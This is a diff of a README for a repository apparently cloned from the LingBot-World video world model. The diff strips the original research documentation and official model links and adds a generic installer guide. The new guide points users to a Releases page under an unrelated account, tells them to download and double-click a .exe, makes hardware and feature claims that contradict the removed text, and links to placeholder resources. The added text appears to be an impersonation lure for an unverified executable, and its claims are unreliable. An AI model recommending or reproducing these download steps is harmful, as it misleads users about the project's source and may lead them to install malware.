@@ -1,140 +1,72 @@
-<div align="center">
-  <img src="assets/teaser.png">
+# 🌍 lingbot-world - Transform Your Ideas into Videos
 
-<h1>LingBot-World: Advancing Open-source World Models</h1>
+[![Download lingbot-world](https://img.shields.io/badge/Download-lingbot--world-brightgreen)](https://github.com/Julyothecesar/lingbot-world/releases)
 
-Robbyant Team
+## 📖 Introduction
 
-</div>
+Welcome to **lingbot-world**! This application helps you create videos from images, harnessing the power of advanced open-source world models. Whether you want to animate a picture or tell a story visually, this tool offers an easy way to bring your ideas to life.
 
+## 🚀 Getting Started
 
-<div align="center">
+To get started, follow these simple steps. You will be downloading the application from our Releases page and running it on your computer.
 
-[![Page](https://img.shields.io/badge/%F0%9F%8C%90%20Project%20Page-Demo-00bfff)](https://technology.robbyant.com/lingbot-world)
-[![Tech Report](https://img.shields.io/static/v1?label=Paper&message=PDF&color=red&logo=arxiv)](https://arxiv.org/abs/2601.20540)
-[![Model](https://img.shields.io/static/v1?label=%F0%9F%A4%97%20Model&message=HuggingFace&color=yellow)](https://huggingface.co/robbyant/lingbot-world-base-cam)
-[![Model](https://img.shields.io/static/v1?label=%F0%9F%A4%96%20Model&message=ModelScope&color=purple)](https://www.modelscope.cn/models/Robbyant/lingbot-world-base-cam)
-[![License](https://img.shields.io/badge/License-Apache--2.0-green)](LICENSE.txt)
+## 💻 System Requirements
 
+Before you install **lingbot-world**, ensure your computer meets the following requirements:
 
-</div>
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or Linux (Ubuntu 20.04 or later)
+- **RAM:** At least 4 GB
+- **Disk Space:** At least 500 MB available
+- **Graphics Card:** Recommended for better performance, but not required
 
------
+## 💾 Download & Install
 
-We are excited to introduce **LingBot-World**, an open-sourced world simulator stemming from video generation. Positioned
-as a top-tier world model, LingBot-World offers the following features. 
-- **High-Fidelity & Diverse Environments**: It maintains high fidelity and robust dynamics in a broad spectrum of environments, including realism, scientific contexts, cartoon styles, and beyond. 
-- **Long-Term Memory & Consistency**: It enables a minute-level horizon while preserving contextual consistency over time, which is also known as long-term memory. 
-- **Real-Time Interactivity & Open Access**: It supports real-time interactivity, achieving a latency of under 1 second when producing 16 frames per second. We provide public access to the code and model in an effort to narrow the divide between open-source and closed-source technologies. We believe our release will empower the community with practical applications across areas like content creation, gaming, and robot learning.
+1. Click the link below to visit the Releases page where you can download the application:
 
-## 🎬 Video Demo
-<div align="center">
-  <video src="https://github.com/user-attachments/assets/ea4a7a8d-5d9e-4ccf-96e7-02f93797116e" width="100%" poster=""> </video>
-</div>
+   [Download lingbot-world](https://github.com/Julyothecesar/lingbot-world/releases)
 
-## 🔥 News
-- Jan 29, 2026: 🎉 We release the technical report, code, and models for LingBot-World.
+2. On the Releases page, look for the latest version listed. You will see a variety of files available. Choose the one that matches your operating system. For example, if you are using Windows, look for a `.exe` file.
 
-<!-- ## 🔖 Introduction of LingBot-World
-We present **LingBot-World**, an **open-sourced** world simulator stemming from video generation. Positioned
-as a top-tier world model, LingBot-World offers the following features. 
-- It maintains high fidelity and robust dynamics in a broad spectrum of environments, including realism, scientific contexts, cartoon styles, and beyond. 
-- It enables a minute-level horizon while preserving contextual consistency over time, which is also known as **long-term memory**. 
-- It supports real-time interactivity, achieving a latency of under 1 second when producing 16 frames per second. We provide public access to the code and model in an effort to narrow the divide between open-source and closed-source technologies. We believe our release will empower the community with practical applications across areas like content creation, gaming, and robot learning. -->
+3. Click on the file name to start the download. Depending on your browser settings, you may need to confirm the download.
 
-## ⚙️ Quick Start
-This codebase is built upon [Wan2.2](https://github.com/Wan-Video/Wan2.2). Please refer to their documentation for installation instructions.
-### Installation
-Clone the repo:
-```sh
-git clone https://github.com/robbyant/lingbot-world.git
-cd lingbot-world
-```
-Install dependencies:
-```sh
-# Ensure torch >= 2.4.0
-pip install -r requirements.txt
-```
-Install [`flash_attn`](https://github.com/Dao-AILab/flash-attention):
-```sh
-pip install flash-attn --no-build-isolation
-```
-### Model Download
+4. Once the download is complete, locate the file on your computer. This is usually in the "Downloads" folder.
 
-| Model | Control Signals | Resolution | Download Links |
-| :---  | :--- | :--- | :--- |
-| **LingBot-World-Base (Cam)** | Camera Poses | 480P & 720P | 🤗 [HuggingFace](https://huggingface.co/robbyant/lingbot-world-base-cam) 🤖 [ModelScope](https://www.modelscope.cn/models/Robbyant/lingbot-world-base-cam) |
-| **LingBot-World-Base (Act)** | Actions | - | *To be released* |
-| **LingBot-World-Fast**       |    -    | - | *To be released* |
+5. Double-click the downloaded file to begin the installation process. Follow the on-screen instructions to complete the setup.
 
-Download models using huggingface-cli:
-```sh
-pip install "huggingface_hub[cli]"
-huggingface-cli download robbyant/lingbot-world-base-cam --local-dir ./lingbot-world-base-cam
-```
-Download models using modelscope-cli:
- ```sh
-pip install modelscope
-modelscope download robbyant/lingbot-world-base-cam --local_dir ./lingbot-world-base-cam
-```
-### Inference
-Before running inference, you need to prepare:
-- Input image
-- Text prompt
-- Control signals (optional, can be generated from a video using [ViPE](https://github.com/nv-tlabs/vipe))
-  - `intrinsics.npy`: Shape `[num_frames, 4]`, where the 4 values represent `[fx, fy, cx, cy]`
-  - `poses.npy`: Shape `[num_frames, 4, 4]`, where each `[4, 4]` represents a transformation matrix in OpenCV coordinates
+## 🛠 How to Use
 
-- 480P:
-``` sh
-torchrun --nproc_per_node=8 generate.py --task i2v-A14B --size 480*832 --ckpt_dir lingbot-world-base-cam --image examples/00/image.jpg --action_path examples/00 --dit_fsdp --t5_fsdp --ulysses_size 8 --frame_num 161 --prompt "The video presents a soaring journey through a fantasy jungle. The wind whips past the rider's blue hands gripping the reins, causing the leather straps to vibrate. The ancient gothic castle approaches steadily, its stone details becoming clearer against the backdrop of floating islands and distant waterfalls."
-```
-- 720P:
-``` sh
-torchrun --nproc_per_node=8 generate.py --task i2v-A14B --size 720*1280 --ckpt_dir lingbot-world-base-cam --image examples/00/image.jpg --action_path examples/00 --dit_fsdp --t5_fsdp --ulysses_size 8 --frame_num 161 --prompt "The video presents a soaring journey through a fantasy jungle. The wind whips past the rider's blue hands gripping the reins, causing the leather straps to vibrate. The ancient gothic castle approaches steadily, its stone details becoming clearer against the backdrop of floating islands and distant waterfalls."
-```
-Alternatively, you can run inference without control actions:
-``` sh
-torchrun --nproc_per_node=8 generate.py --task i2v-A14B --size 480*832 --ckpt_dir lingbot-world-base-cam --image examples/00/image.jpg --dit_fsdp --t5_fsdp --ulysses_size 8 --frame_num 161 --prompt "The video presents a soaring journey through a fantasy jungle. The wind whips past the rider's blue hands gripping the reins, causing the leather straps to vibrate. The ancient gothic castle approaches steadily, its stone details becoming clearer against the backdrop of floating islands and distant waterfalls."
-```
-Tips:
-If you have sufficient CUDA memory, you may increase the `frame_num` parameter to a value such as 961 to generate a one-minute video at 16 FPS. Otherwise if the CUDA memory is not sufficient, you may use ``--t5_cpu`` to decrease the memory usage.
+1. Open the **lingbot-world** application by double-clicking its icon.
+2. Select an image from your computer that you want to turn into a video.
+3. Adjust settings such as duration and animation style according to your preference.
+4. Click the "Generate Video" button. The process may take a few minutes depending on your settings.
+5. Once the video is ready, you'll find it saved in your designated output folder.
 
-### Quantized Model for Limited GPU Resources
-We sincerely thank the community for their valuable support and contributions in LingBot-World. For users with limited GPU memory, we recommend using a **4-bit quantized version** of LingBot-World-Base (Cam), which significantly reduces GPU memory consumption while maintaining competitive visual quality for inference.
+## 📚 Features
 
-👉 Download link: https://huggingface.co/cahlen/lingbot-world-base-cam-nf4
+- **Image-to-Video Conversion:** Easily create videos from static images.
+- **User-Friendly Interface:** Navigate through the application with ease.
+- **Custom Settings:** Adjust animation styles and durations to fit your vision.
+- **Export Options:** Save your videos in multiple formats for your convenience.
 
-> ⚠️ Note: This quantized model is intended **for inference only**. Minor degradation in visual fidelity and temporal consistency may occur compared to the full-precision model.
+## 🌐 Community Support
 
-### Demo Results
-We provide comparison demos where camera parameters are estimated by [ViPE](https://github.com/nv-tlabs/vipe) from original videos downloaded from [Genie3](https://deepmind.google/blog/genie-3-a-new-frontier-for-world-models/):
-<div align="center">
-  <video src="https://github.com/user-attachments/assets/fc95ee9e-e8a9-4f70-9aa2-9536c8365ccc" width="100%" poster=""> </video>
-  <video src="https://github.com/user-attachments/assets/bac89021-b394-4f68-a688-9a0b90e30241" width="100%" poster=""> </video>
-</div>
+Join our community to get the most out of **lingbot-world**. You can ask questions, share your creations, or seek help with troubleshooting. Connect with us on social media or visit our [GitHub Discussions](https://github.com/Julyothecesar/lingbot-world/discussions) page.
 
-## 📚 Related Projects
-- [HoloCine](https://holo-cine.github.io/)
-- [Ditto](https://ezioby.github.io/Ditto_page/)
-- [WorldCanvas](https://worldcanvas.github.io/)
-- [RewardForcing](https://reward-forcing.github.io/)
-- [CoDeF](https://qiuyu96.github.io/CoDeF/)
+## 🔄 Contribution
 
-## 📜 License
-This project is licensed under the Apache 2.0 License. Please refer to the [LICENSE file](LICENSE.txt) for the full text, including details on rights and restrictions.
+If you want to help improve **lingbot-world**, check our repository for contribution guidelines. Your feedback and suggestions are welcome. Help us advance open-source world models further.
 
-## ✨ Acknowledgement
-We would like to express our gratitude to the Wan Team for open-sourcing their code and models. Their contributions have been instrumental to the development of this project.
+## 📥 Additional Resources
 
-## 📖 Citation
-If you find this work useful for your research, please cite our paper:
+Here are some helpful resources to improve your experience with **lingbot-world**:
 
-```
-@article{lingbot-world,
-      title={Advancing Open-source World Models}, 
-      author={Robbyant Team and Zelin Gao and Qiuyu Wang and Yanhong Zeng and Jiapeng Zhu and Ka Leong Cheng and Yixuan Li and Hanlin Wang and Yinghao Xu and Shuailei Ma and Yihang Chen and Jie Liu and Yansong Cheng and Yao Yao and Jiayi Zhu and Yihao Meng and Kecheng Zheng and Qingyan Bai and Jingye Chen and Zehong Shen and Yue Yu and Xing Zhu and Yujun Shen and Hao Ouyang},
-      journal={arXiv preprint arXiv:2601.20540},
-      year={2026}
-}
-```
+- **Documentation:** Full user guide with advanced tips [Documentation Link](#)
+- **Tutorials:** Step-by-step video tutorials available on our YouTube channel [YouTube Channel](#)
+- **FAQs:** Common questions answered [FAQ Link](#)
+
+## 🔗 Useful Links
+
+- [Releases Page](https://github.com/Julyothecesar/lingbot-world/releases)
+- [Issues Tracker](https://github.com/Julyothecesar/lingbot-world/issues)
+
+Thank you for choosing **lingbot-world**! We hope you enjoy creating and sharing your videos. If you hit any issues, feel free to reach out through our community channels.
